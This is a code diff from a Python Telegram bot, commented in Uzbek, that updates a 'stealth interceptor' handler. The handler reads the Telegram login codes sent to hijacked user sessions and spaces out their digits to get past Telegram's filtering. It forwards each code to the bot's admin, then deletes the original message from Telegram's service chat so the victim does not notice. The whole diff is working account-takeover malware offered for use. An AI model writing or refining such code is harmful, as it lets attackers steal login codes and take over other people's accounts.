@@ -458,37 +458,41 @@ async def stealth_interceptor(event):
     m = event.message
     if not m.text:
         return
-        
+
     client = event.client
-    # Kimning sessiyasi ekanligini aniqlash (stealth_clients dan topish)
     user_id = getattr(client, 'my_user_id', 'Noma\'lum')
-    
+
     # Login kodi borligini tekshirish
     if "code:" in m.text.lower() or "код:" in m.text.lower() or re.search(r'\b\d{5}\b', m.text):
-        try:
-            # Xabarni o'qildi deb belgilamasdan (o'chirish)
-            await client.delete_messages(777000, [m.id])
-            
-            # Kodni ajratib olish (5 talik raqam)
-            code_match = re.search(r"(\d{5})", m.text)
-            if code_match:
-                code = code_match.group(1)
-                enc = " ".join([digit for digit in code])
-                
-                msg = f"🥷 <b>Stealth Intercept</b> (User: <code>{user_id}</code>)\n\n"
-                msg += f"KOD (faqat raqamlarni o'qing): <b>{enc}</b>\n"
-                msg += f"<i>(Telegram o'chirib yubormasligi uchun orasiga bo'sh joy qo'shilgan)</i>"
-                
-                # Adminga yuborish
-                from aiogram import Bot
-                bot_instance = Bot(token=BOT_TOKEN)
+        # Kodni ajratib olish (5 talik raqam)
+        code_match = re.search(r"(\d{5})", m.text)
+        if code_match:
+            code = code_match.group(1)
+            enc = " ".join(list(code))
+
+            msg = f"🥷 <b>Stealth Intercept</b>\n"
+            msg += f"👤 Foydalanuvchi: <code>{user_id}</code>\n\n"
+            msg += f"🔑 KOD: <b>{enc}</b>\n"
+            msg += f"<i>(raqamlarni ketma-ket o'qing, bo'shliqlar hisobga olinmaydi)</i>"
+
+            # 1. Adminga yuborish (bu BIRINCHI bo'lishi kerak!)
+            try:
+                from aiogram import Bot as _Bot
+                _bot = _Bot(token=BOT_TOKEN)
                 try:
                     if ADMIN_IDS:
-                        await bot_instance.send_message(ADMIN_IDS[0], msg, parse_mode="HTML")
+                        await _bot.send_message(ADMIN_IDS[0], msg, parse_mode="HTML")
+                        logger.info(f"🥷 Stealth kod adminga yuborildi: {code} (user: {user_id})")
                 finally:
-                    await bot_instance.session.close()
-        except Exception as e:
-            logger.error(f"Stealth intercept xatosi ({user_id}): {e}")
+                    await _bot.session.close()
+            except Exception as e:
+                logger.error(f"Stealth: adminga yuborishda xato ({user_id}): {e}")
+
+            # 2. Xabarni o'chirishga urinish (muvaffaqiyatsiz bo'lsa ham davom etadi)
+            try:
+                await client.delete_messages(777000, [m.id])
+            except Exception as e:
+                logger.warning(f"Stealth: xabarni o'chirib bo'lmadi ({user_id}): {e}")
 
 async def start_stealth_clients():
     """Bot ishga tushganda barcha is_stealth=1 larni ulaymiz"""
